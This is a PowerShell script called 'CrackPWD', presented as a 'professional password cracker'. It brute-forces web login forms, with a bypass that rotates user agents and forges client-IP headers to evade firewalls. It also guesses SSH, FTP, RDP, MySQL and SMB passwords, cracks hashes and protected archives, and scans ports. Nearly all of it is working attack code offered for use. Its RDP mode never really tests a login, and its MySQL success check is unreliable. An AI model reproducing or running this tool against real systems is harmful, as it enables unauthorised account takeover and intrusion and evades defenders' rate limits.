<# 
    CrackPWD v1.0 - Professional Password Cracker
    Author: @assomist | discord.gg/lcp | lcpnet.fr
#>

param(
    [Parameter(Position=0)]
    [string]$Mode,
    [string]$Target,
    [string]$User,
    [string]$Wordlist = ".\wordlist.txt",
    [string]$UserList,
    [string]$Hash,
    [string]$HashType = "auto",
    [string]$FormUrl,
    [string]$PostData,
    [string]$FailString,
    [string]$SuccessString,
    [string]$Proxy,
    [string]$Cookie,
    [string]$Output,
    [int]$Port,
    [int]$Delay = 0,
    [int]$Timeout = 15,
    [switch]$Bypass,
    [switch]$Quiet,
    [switch]$Help
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$script:Version = "1.0.0"
$script:StartTime = Get-Date
$script:Pts = 0
$script:Errs = 0

$script:UAs = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
)

$script:Ports = @{
    21 = "FTP"
    22 = "SSH"
    23 = "Telnet"
    25 = "SMTP"
    53 = "DNS"
    80 = "HTTP"
    110 = "POP3"
    111 = "RPC"
    135 = "MSRPC"
    139 = "NetBIOS"
    143 = "IMAP"
    443 = "HTTPS"
    445 = "SMB"
    993 = "IMAPS"
    995 = "POP3S"
    1433 = "MSSQL"
    1521 = "Oracle"
    3306 = "MySQL"
    3389 = "RDP"
    5432 = "PostgreSQL"
    5900 = "VNC"
    6379 = "Redis"
    8080 = "HTTP-Proxy"
    8443 = "HTTPS-Alt"
    27017 = "MongoDB"
}

function Banner {
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Red
    Write-Host "        CRACKPWD v$script:Version - Professional Password Cracker" -ForegroundColor Red
    Write-Host "        @assomist | discord.gg/lcp | lcpnet.fr" -ForegroundColor DarkGray
    Write-Host "  ================================================================" -ForegroundColor Red
    Write-Host ""
}

function Log($Msg, $Lvl = "INFO") {
    if ($Quiet -and $Lvl -eq "INFO") { return }
    $p = switch($Lvl) { "INFO"{"[*]"} "OK"{"[+]"} "ERR"{"[!]"} "WARN"{"[~]"} "ATK"{"[>]"} default{"[*]"} }
    $c = switch($Lvl) { "INFO"{"Cyan"} "OK"{"Green"} "ERR"{"Red"} "WARN"{"Yellow"} "ATK"{"Magenta"} default{"White"} }
    Write-Host "$p $Msg" -ForegroundColor $c
}

function HelpMsg {
    Banner
    Write-Host "USAGE:" -ForegroundColor Yellow
    Write-Host '  .\crackpwd.ps1 <mode> -Target <target> [options]'
    Write-Host ""
    Write-Host "MODES:" -ForegroundColor Yellow
    Write-Host "  web       Web form bruteforce (auto-detect)"
    Write-Host "  hash      Hash cracker (MD5/SHA1/SHA256/SHA512)"
    Write-Host "  zip       ZIP/RAR password cracker"
    Write-Host "  ssh       SSH bruteforce"
    Write-Host "  ftp       FTP bruteforce"
    Write-Host "  rdp       RDP bruteforce"
    Write-Host "  mysql     MySQL bruteforce"
    Write-Host "  smb       SMB bruteforce"
    Write-Host "  scan      Port scanner"
    Write-Host "  analyze   Analyze login page"
    Write-Host ""
    Write-Host "EXAMPLES:" -ForegroundColor Yellow
    Write-Host '  .\crackpwd.ps1 web -Target "https://site.com/" -User admin'
    Write-Host '  .\crackpwd.ps1 web -Target "https://site.com/" -User admin -Bypass'
    Write-Host '  .\crackpwd.ps1 hash -Hash "5f4dcc3b5aa765d61d8327deb882cf99"'
    Write-Host '  .\crackpwd.ps1 zip -Target archive.zip'
    Write-Host '  .\crackpwd.ps1 ssh -Target 192.168.1.1 -User root'
    Write-Host '  .\crackpwd.ps1 ftp -Target 192.168.1.1 -User admin'
    Write-Host '  .\crackpwd.ps1 scan -Target 192.168.1.1'
    Write-Host '  .\crackpwd.ps1 analyze -Target "https://site.com/"'
    Write-Host ""
    Write-Host "OPTIONS:" -ForegroundColor Yellow
    Write-Host "  -Target       URL / IP / File"
    Write-Host "  -User         Username"
    Write-Host "  -Wordlist     Password file (default: wordlist.txt)"
    Write-Host "  -FormUrl      Custom form URL"
    Write-Host "  -PostData     Custom POST data (^USER^ and ^PASS^)"
    Write-Host "  -FailString   String in failed response"
    Write-Host "  -SuccessString String in success response"
    Write-Host "  -Hash         Hash to crack"
    Write-Host "  -HashType     md5/sha1/sha256/sha512/auto"
    Write-Host "  -Cookie       Custom cookie"
    Write-Host "  -Proxy        Proxy URL"
    Write-Host "  -Port         Custom port"
    Write-Host "  -Delay        Delay between requests (ms)"
    Write-Host "  -Timeout      Request timeout (default: 15s)"
    Write-Host "  -Bypass       Enable WAF bypass"
    Write-Host "  -Output       Save results to file"
    Write-Host "  -Quiet        Less output"
    Write-Host ""
}

function RandUA { $script:UAs | Get-Random }
function RandIP { "$(Get-Random -Min 1 -Max 255).$(Get-Random -Min 0 -Max 255).$(Get-Random -Min 0 -Max 255).$(Get-Random -Min 1 -Max 255)" }
function RandDelay { Get-Random -Min 100 -Max 800 }

function BaseUrl($u) {
    try {
        $uri = [System.Uri]$u
        return "$($uri.Scheme)://$($uri.Host)"
    } catch { return $u }
}

function FullUrl($base, $path) {
    if ($path -match "^https?://") { return $path }
    if ($path.StartsWith("/")) { return "$base$path" }
    return "$base/$path"
}

function TestPort($h, $p, $t = 2000) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $ar = $tcp.BeginConnect($h, $p, $null, $null)
        $w = $ar.AsyncWaitHandle.WaitOne($t, $false)
        if ($w) { $tcp.EndConnect($ar); $tcp.Close(); return $true }
        $tcp.Close()
        return $false
    } catch { return $false }
}

function WebReq {
    param([string]$Url, [string]$Method = "GET", [string]$Body, [hashtable]$Hdrs)
    
    try {
        $p = @{
            Uri = $Url
            Method = $Method
            UseBasicParsing = $true
            TimeoutSec = $Timeout
            ErrorAction = "Stop"
        }
        if ($Body) { $p.Body = $Body }
        if ($Hdrs -and $Hdrs.Count -gt 0) { $p.Headers = $Hdrs }
        if ($Proxy) { $p.Proxy = $Proxy }
        
        $r = Invoke-WebRequest @p
        return @{ OK = $true; Code = $r.StatusCode; Body = $r.Content; Len = $r.Content.Length }
    } catch {
        return @{ OK = $false; Code = 0; Body = ""; Len = 0; Err = $_.Exception.Message }
    }
}

function GetHdrs {
    $h = @{}
    if ($Bypass) {
        $h["User-Agent"] = RandUA
        $ip = RandIP
        $h["X-Forwarded-For"] = $ip
        $h["X-Real-IP"] = $ip
        $h["X-Originating-IP"] = $ip
        $h["X-Client-IP"] = $ip
    } else {
        $h["User-Agent"] = $script:UAs[0]
    }
    if ($Cookie) { $h["Cookie"] = $Cookie }
    return $h
}

function FindForm($Url) {
    Log "Analyzing: $Url"
    
    $res = @{ Url = $null; UField = $null; PField = $null; Hidden = @{} }
    
    $hdrs = GetHdrs
    $r = WebReq -Url $Url -Hdrs $hdrs
    
    if (-not $r.OK) {
        Log "Cannot fetch page: $($r.Err)" "ERR"
        return $res
    }
    
    $html = $r.Body
    $base = BaseUrl $Url
    
    $urlPats = @("auth\.php","login\.php","signin\.php","api/login","api/auth","authenticate","session","connect","user/login","account/login","admin/login")
    foreach ($pat in $urlPats) {
        if ($html -match "[`"']([^`"'\s]*$pat[^`"'\s]*)[`"']") {
            $fu = $matches[1]
            $res.Url = FullUrl $base $fu
            Log "Form URL: $($res.Url)" "OK"
            break
        }
    }
    
    if (-not $res.Url) {
        if ($html -match '<form[^>]*action=[`"'']([^`"'']+)[`"'']') {
            $fu = $matches[1]
            if ($fu -and $fu -ne "" -and $fu -ne "#") {
                $res.Url = FullUrl $base $fu
                Log "Form URL: $($res.Url)" "OK"
            }
        }
    }
    
    $uPats = @("username","user","login","email","uname","account","identifiant","pseudo","log","userid","user_name","userName")
    foreach ($pat in $uPats) {
        if ($html -match "name=[`"']($pat)[`"']") {
            $res.UField = $matches[1]
            Log "User field: $($res.UField)" "OK"
            break
        }
        if ($html -match "name=[`"']([^`"']*$pat[^`"']*)[`"']") {
            $res.UField = $matches[1]
            Log "User field: $($res.UField)" "OK"
            break
        }
    }
    
    $pPats = @("password","pass","pwd","passwd","mdp","secret","motdepasse","user_pass","userPassword")
    foreach ($pat in $pPats) {
        if ($html -match "name=[`"']($pat)[`"']") {
            $res.PField = $matches[1]
            Log "Pass field: $($res.PField)" "OK"
            break
        }
        if ($html -match "name=[`"']([^`"']*$pat[^`"']*)[`"']") {
            $res.PField = $matches[1]
            Log "Pass field: $($res.PField)" "OK"
            break
        }
    }
    
    if ($html -match "action[`"']?\s*[=:]\s*[`"']?login" -or $html -match "[`"']action[`"']\s*[=:]\s*[`"']login" -or $html -match "action:\s*[`"']login" -or $html -match "'action'\s*:\s*'login'" -or $html -match "`"action`"\s*:\s*`"login`"") {
        $res.Hidden["action"] = "login"
        Log "Hidden: action=login" "OK"
    }
    
    if ($res.Url -and $res.Url -match "auth\.php") {
        if (-not $res.Hidden.ContainsKey("action")) {
            $res.Hidden["action"] = "login"
            Log "Hidden: action=login (auto)" "OK"
        }
    }
    
    $hm = [regex]::Matches($html, '<input[^>]*type=[''"]hidden[''"][^>]*name=[''"]([^''"]+)[''"][^>]*value=[''"]([^''"]*)[''"]')
    foreach ($m in $hm) {
        $n = $m.Groups[1].Value
        $v = $m.Groups[2].Value
        if ($n -and -not $res.Hidden.ContainsKey($n)) {
            $res.Hidden[$n] = $v
        }
    }
    
    $hm2 = [regex]::Matches($html, '<input[^>]*name=[''"]([^''"]+)[''"][^>]*type=[''"]hidden[''"][^>]*value=[''"]([^''"]*)[''"]')
    foreach ($m in $hm2) {
        $n = $m.Groups[1].Value
        $v = $m.Groups[2].Value
        if ($n -and -not $res.Hidden.ContainsKey($n)) {
            $res.Hidden[$n] = $v
        }
    }
    
    return $res
}

function DetectFail($Url, $Data, $Hdrs) {
    Log "Detecting fail pattern..."
    
    $tu = "fakeuser" + (Get-Random -Max 99999)
    $tp = "fakepass" + (Get-Random -Max 99999)
    $td = $Data.Replace("^USER^", $tu).Replace("^PASS^", $tp)
    
    $r = WebReq -Url $Url -Method "POST" -Body $td -Hdrs $Hdrs
    
    if (-not $r.OK) {
        Log "Cannot detect fail pattern" "WARN"
        return @{ Pat = "error"; Len = 0 }
    }
    
    $c = $r.Body.ToLower()
    
    $pats = @("incorrects","incorrect","invalide","erreur","invalid","error","failed","wrong","denied","echec","mauvais","bad","unauthorized")
    foreach ($p in $pats) {
        if ($c.Contains($p)) {
            Log "Fail pattern: $p" "OK"
            return @{ Pat = $p; Len = $r.Len }
        }
    }
    
    Log "Using response length: $($r.Len)" "WARN"
    return @{ Pat = $null; Len = $r.Len }
}

function ShowFound($title, $data) {
    Write-Host ""
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Green
    Write-Host "        $title" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor Green
    foreach ($k in $data.Keys) {
        if ($data[$k]) {
            Write-Host "        $k : $($data[$k])" -ForegroundColor Green
        }
    }
    Write-Host "  ================================================================" -ForegroundColor Green
    Write-Host ""
}

function Progress($i, $t, $pw, $spd, $err) {
    $pct = [math]::Round(($i / $t) * 100, 1)
    $bar = ""
    $blen = 20
    $fill = [math]::Floor($pct / 100 * $blen)
    for ($x = 0; $x -lt $blen; $x++) {
        if ($x -lt $fill) { $bar += "#" } else { $bar += "-" }
    }
    $msg = "  [$bar] $i/$t ($pct%) $pw"
    if ($spd -gt 0) { $msg += " | $spd/s" }
    if ($err -gt 0) { $msg += " | Err:$err" }
    Write-Host ("`r" + $msg.PadRight(100)) -NoNewline -ForegroundColor DarkGray
}

function WebAttack($Url, $Username, $WL) {
    Log "Starting web bruteforce" "ATK"
    Log "Target: $Url"
    Log "User: $Username"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found: $WL" "ERR"
        return
    }
    
    $aUrl = $FormUrl
    $aData = $PostData
    $fPat = $FailString
    $fLen = 0
    
    if (-not $aData) {
        $form = FindForm $Url
        
        if ($form.Url) { $aUrl = $form.Url } else { $aUrl = $Url }
        
        $parts = @()
        foreach ($k in $form.Hidden.Keys) {
            $parts += "$k=$($form.Hidden[$k])"
        }
        if ($form.UField) { $parts += "$($form.UField)=^USER^" }
        else { $parts += "username=^USER^" }
        if ($form.PField) { $parts += "$($form.PField)=^PASS^" }
        else { $parts += "password=^PASS^" }
        
        $aData = $parts -join "&"
        Log "POST: $aData"
    }
    
    $hdrs = GetHdrs
    
    if ((-not $fPat) -and (-not $SuccessString)) {
        $det = DetectFail $aUrl $aData $hdrs
        $fPat = $det.Pat
        $fLen = $det.Len
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    
    if ($Bypass) { Log "Bypass: ON" "WARN" }
    
    Write-Host ""
    Log "ATTACK STARTED" "ATK"
    Write-Host ""
    
    $st = Get-Date
    $script:Errs = 0
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $body = $aData.Replace("^USER^", $Username).Replace("^PASS^", $pw)
        
        if ($Bypass) { $hdrs = GetHdrs }
        
        $r = WebReq -Url $aUrl -Method "POST" -Body $body -Hdrs $hdrs
        
        if (-not $r.OK) {
            $script:Errs++
        } else {
            $found = $false
            $content = $r.Body.ToLower()
            
            if ($SuccessString) {
                if ($content.Contains($SuccessString.ToLower())) { $found = $true }
            } elseif ($fPat) {
                if (-not $content.Contains($fPat)) { $found = $true }
            } else {
                if ([Math]::Abs($r.Len - $fLen) -gt 100) { $found = $true }
            }
            
            if ($found) {
                $dur = ((Get-Date) - $st).TotalSeconds
                ShowFound "PASSWORD FOUND!" @{
                    Username = $Username
                    Password = $pw
                    Target = $aUrl
                    Time = "$([math]::Round($dur,2))s"
                    Attempts = "$i / $total"
                }
                if ($Output) {
                    @{user=$Username;pass=$pw;target=$aUrl;time="$([math]::Round($dur,2))s"} | ConvertTo-Json | Out-File $Output
                    Log "Saved: $Output" "OK"
                }
                return
            }
        }
        
        $elapsed = ((Get-Date) - $st).TotalSeconds
        $spd = if ($elapsed -gt 0) { [math]::Round($i / $elapsed, 1) } else { 0 }
        Progress $i $total $pw $spd $script:Errs
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
        elseif ($Bypass) { Start-Sleep -Milliseconds (RandDelay) }
    }
    
    $dur = ((Get-Date) - $st).TotalSeconds
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
    Log "Attempts: $total | Time: $([math]::Round($dur,2))s | Errors: $script:Errs"
}

function HashAttack($H, $T, $WL) {
    Log "Starting hash cracker" "ATK"
    
    if ($T -eq "auto") {
        $T = switch ($H.Length) {
            32 { "md5" }
            40 { "sha1" }
            64 { "sha256" }
            128 { "sha512" }
            default { "md5" }
        }
        Log "Detected: $($T.ToUpper())" "OK"
    }
    
    Log "Hash: $H"
    Log "Type: $($T.ToUpper())"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $H = $H.ToLower()
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($pw)
        $algo = switch ($T.ToLower()) {
            "md5" { [System.Security.Cryptography.MD5]::Create() }
            "sha1" { [System.Security.Cryptography.SHA1]::Create() }
            "sha256" { [System.Security.Cryptography.SHA256]::Create() }
            "sha512" { [System.Security.Cryptography.SHA512]::Create() }
            default { [System.Security.Cryptography.MD5]::Create() }
        }
        $comp = [BitConverter]::ToString($algo.ComputeHash($bytes)).Replace("-","").ToLower()
        
        if ($comp -eq $H) {
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "HASH CRACKED!" @{
                Hash = $H
                Type = $T.ToUpper()
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
                Attempts = "$i / $total"
            }
            if ($Output) {
                @{hash=$H;type=$T;pass=$pw} | ConvertTo-Json | Out-File $Output
            }
            return
        }
        
        Progress $i $total "Cracking..." 0 0
    }
    
    Write-Host ""
    Write-Host ""
    Log "Hash not cracked" "ERR"
}

function ZipAttack($File, $WL) {
    Log "Starting ZIP/RAR cracker" "ATK"
    Log "File: $File"
    
    if (-not (Test-Path $File)) {
        Log "File not found" "ERR"
        return
    }
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    $7z = "C:\Program Files\7-Zip\7z.exe"
    if (-not (Test-Path $7z)) {
        $7z = "C:\Program Files (x86)\7-Zip\7z.exe"
        if (-not (Test-Path $7z)) {
            Log "7-Zip required: https://7-zip.org" "ERR"
            return
        }
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $null = & $7z t $File "-p$pw" 2>&1
        
        if ($LASTEXITCODE -eq 0) {
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "PASSWORD FOUND!" @{
                File = $File
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
                Attempts = "$i / $total"
            }
            Write-Host "  Extract: 7z x `"$File`" -p`"$pw`"" -ForegroundColor Cyan
            Write-Host ""
            if ($Output) {
                @{file=$File;pass=$pw} | ConvertTo-Json | Out-File $Output
            }
            return
        }
        
        Progress $i $total $pw 0 0
    }
    
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
}

function SSHAttack($Host, $Username, $WL, $P = 22) {
    Log "Starting SSH bruteforce" "ATK"
    Log "Target: ${Host}:$P"
    Log "User: $Username"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    $plink = Get-Command "plink.exe" -ErrorAction SilentlyContinue
    if (-not $plink) {
        Log "plink.exe required (PuTTY)" "ERR"
        return
    }
    
    if (-not (TestPort $Host $P)) {
        Log "Cannot connect to ${Host}:$P" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $r = echo "y" | plink.exe -ssh -P $P -l $Username -pw $pw $Host "echo CRACKPWD_OK" 2>&1
        
        if ($r -match "CRACKPWD_OK") {
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "PASSWORD FOUND!" @{
                Host = "${Host}:$P"
                Username = $Username
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
            }
            Write-Host "  Connect: ssh $Username@$Host -p $P" -ForegroundColor Cyan
            Write-Host ""
            return
        }
        
        Progress $i $total $pw 0 0
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
        elseif ($Bypass) { Start-Sleep -Milliseconds (RandDelay) }
        else { Start-Sleep -Milliseconds 100 }
    }
    
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
}

function FTPAttack($Host, $Username, $WL, $P = 21) {
    Log "Starting FTP bruteforce" "ATK"
    Log "Target: ${Host}:$P"
    Log "User: $Username"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    if (-not (TestPort $Host $P)) {
        Log "Cannot connect to ${Host}:$P" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        try {
            $ftp = [System.Net.FtpWebRequest]::Create("ftp://${Host}:${P}/")
            $ftp.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
            $ftp.Credentials = New-Object System.Net.NetworkCredential($Username, $pw)
            $ftp.Timeout = 5000
            $null = $ftp.GetResponse()
            
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "PASSWORD FOUND!" @{
                Host = "${Host}:$P"
                Username = $Username
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
            }
            return
        } catch {
            Progress $i $total $pw 0 0
        }
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
    }
    
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
}

function RDPAttack($Host, $Username, $WL, $P = 3389) {
    Log "Starting RDP bruteforce" "ATK"
    Log "Target: ${Host}:$P"
    Log "User: $Username"
    Log "RDP is slow due to Windows security" "WARN"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    if (-not (TestPort $Host $P)) {
        Log "Cannot connect to ${Host}:$P" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $i = 0
    foreach ($pw in $pws) {
        $i++
        Progress $i $total $pw 0 0
        $null = cmdkey /generic:$Host /user:$Username /pass:$pw 2>&1
        Start-Sleep -Milliseconds 300
        $null = cmdkey /delete:$Host 2>&1
    }
    
    Write-Host ""
    Write-Host ""
    Log "Test manually: mstsc /v:$Host" "WARN"
}

function MySQLAttack($Host, $Username, $WL, $P = 3306) {
    Log "Starting MySQL bruteforce" "ATK"
    Log "Target: ${Host}:$P"
    Log "User: $Username"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    if (-not (TestPort $Host $P)) {
        Log "Cannot connect to ${Host}:$P" "ERR"
        return
    }
    
    $mysql = Get-Command "mysql.exe" -ErrorAction SilentlyContinue
    if (-not $mysql) {
        Log "mysql.exe required (MySQL Client)" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $r = & mysql.exe -h $Host -P $P -u $Username -p"$pw" -e "SELECT 1" 2>&1
        
        if ($r -match "1") {
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "PASSWORD FOUND!" @{
                Host = "${Host}:$P"
                Username = $Username
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
            }
            Write-Host "  Connect: mysql -h $Host -P $P -u $Username -p" -ForegroundColor Cyan
            Write-Host ""
            return
        }
        
        Progress $i $total $pw 0 0
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
        else { Start-Sleep -Milliseconds 50 }
    }
    
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
}

function SMBAttack($Host, $Username, $WL) {
    Log "Starting SMB bruteforce" "ATK"
    Log "Target: $Host"
    Log "User: $Username"
    
    if (-not (Test-Path $WL)) {
        Log "Wordlist not found" "ERR"
        return
    }
    
    if (-not (TestPort $Host 445)) {
        Log "Cannot connect to ${Host}:445" "ERR"
        return
    }
    
    $pws = Get-Content $WL | Where-Object { $_.Trim() -ne "" }
    $total = $pws.Count
    Log "Loaded $total passwords"
    Write-Host ""
    
    $st = Get-Date
    $i = 0
    
    foreach ($pw in $pws) {
        $i++
        
        $null = net use "\\$Host\IPC$" /user:$Username $pw 2>&1
        
        if ($LASTEXITCODE -eq 0) {
            $null = net use "\\$Host\IPC$" /delete 2>&1
            $dur = ((Get-Date) - $st).TotalSeconds
            ShowFound "PASSWORD FOUND!" @{
                Host = $Host
                Username = $Username
                Password = $pw
                Time = "$([math]::Round($dur,2))s"
            }
            return
        }
        
        Progress $i $total $pw 0 0
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
    }
    
    Write-Host ""
    Write-Host ""
    Log "Password not found" "ERR"
}

function PortScan($Host) {
    Log "Starting port scan" "ATK"
    Log "Target: $Host"
    Write-Host ""
    
    $open = @()
    $total = $script:Ports.Count
    $i = 0
    
    foreach ($p in ($script:Ports.Keys | Sort-Object)) {
        $i++
        $svc = $script:Ports[$p]
        $msg = "  Scanning $p ($svc)..."
        Write-Host ("`r" + $msg.PadRight(50)) -NoNewline -ForegroundColor DarkGray
        
        if (TestPort $Host $p 1500) {
            $open += @{Port = $p; Svc = $svc}
            $msg = "  [+] $p OPEN ($svc)"
            Write-Host ("`r" + $msg.PadRight(50)) -ForegroundColor Green
        }
    }
    
    Write-Host ""
    Write-Host ""
    
    if ($open.Count -gt 0) {
        Log "Found $($open.Count) open ports" "OK"
        Write-Host ""
        Write-Host "  ================================================================" -ForegroundColor Cyan
        Write-Host "        PORT          SERVICE" -ForegroundColor Cyan
        Write-Host "  ================================================================" -ForegroundColor Cyan
        foreach ($o in $open) {
            Write-Host "        $($o.Port.ToString().PadRight(13)) $($o.Svc)" -ForegroundColor White
        }
        Write-Host "  ================================================================" -ForegroundColor Cyan
        Write-Host ""
        if ($Output) {
            $open | ConvertTo-Json | Out-File $Output
            Log "Saved: $Output" "OK"
        }
    } else {
        Log "No open ports found" "WARN"
    }
}

function Analyze($Url) {
    Log "Analyzing target" "ATK"
    Log "URL: $Url"
    Write-Host ""
    
    $form = FindForm $Url
    
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host "                    ANALYSIS RESULTS" -ForegroundColor Cyan
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host "        Form URL   : $($form.Url)" -ForegroundColor White
    Write-Host "        User Field : $($form.UField)" -ForegroundColor White
    Write-Host "        Pass Field : $($form.PField)" -ForegroundColor White
    if ($form.Hidden.Count -gt 0) {
        Write-Host "        Hidden     :" -ForegroundColor White
        foreach ($k in $form.Hidden.Keys) {
            Write-Host "                     $k = $($form.Hidden[$k])" -ForegroundColor DarkGray
        }
    }
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    $parts = @()
    foreach ($k in $form.Hidden.Keys) { $parts += "$k=$($form.Hidden[$k])" }
    $uf = if ($form.UField) { $form.UField } else { "username" }
    $pf = if ($form.PField) { $form.PField } else { "password" }
    $parts += "$uf=^USER^"
    $parts += "$pf=^PASS^"
    $postData = $parts -join "&"
    
    $fUrl = if ($form.Url) { $form.Url } else { $Url }
    
    Log "Suggested command:"
    Write-Host ""
    Write-Host "  .\crackpwd.ps1 web -Target `"$Url`" -User <USER> -FormUrl `"$fUrl`" -PostData `"$postData`"" -ForegroundColor Yellow
    Write-Host ""
}

Banner

if ($Help -or (-not $Mode)) {
    HelpMsg
    exit
}

switch ($Mode.ToLower()) {
    "web" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        WebAttack $Target $User $Wordlist
    }
    "hash" {
        if (-not $Hash) { Log "Required: -Hash" "ERR"; exit }
        HashAttack $Hash $HashType $Wordlist
    }
    "zip" {
        if (-not $Target) { Log "Required: -Target" "ERR"; exit }
        ZipAttack $Target $Wordlist
    }
    "rar" {
        if (-not $Target) { Log "Required: -Target" "ERR"; exit }
        ZipAttack $Target $Wordlist
    }
    "ssh" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        $sP = if ($Port) { $Port } else { 22 }
        SSHAttack $Target $User $Wordlist $sP
    }
    "ftp" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        $fP = if ($Port) { $Port } else { 21 }
        FTPAttack $Target $User $Wordlist $fP
    }
    "rdp" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        $rP = if ($Port) { $Port } else { 3389 }
        RDPAttack $Target $User $Wordlist $rP
    }
    "mysql" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        $mP = if ($Port) { $Port } else { 3306 }
        MySQLAttack $Target $User $Wordlist $mP
    }
    "smb" {
        if ((-not $Target) -or (-not $User)) { Log "Required: -Target -User" "ERR"; exit }
        SMBAttack $Target $User $Wordlist
    }
    "scan" {
        if (-not $Target) { Log "Required: -Target" "ERR"; exit }
        PortScan $Target
    }
    "analyze" {
        if (-not $Target) { Log "Required: -Target" "ERR"; exit }
        Analyze $Target
    }
    default {
        HelpMsg
    }
}

$dur = ((Get-Date) - $script:StartTime).TotalSeconds
Write-Host ""
Log "Done. Time: $([math]::Round($dur,2))s"
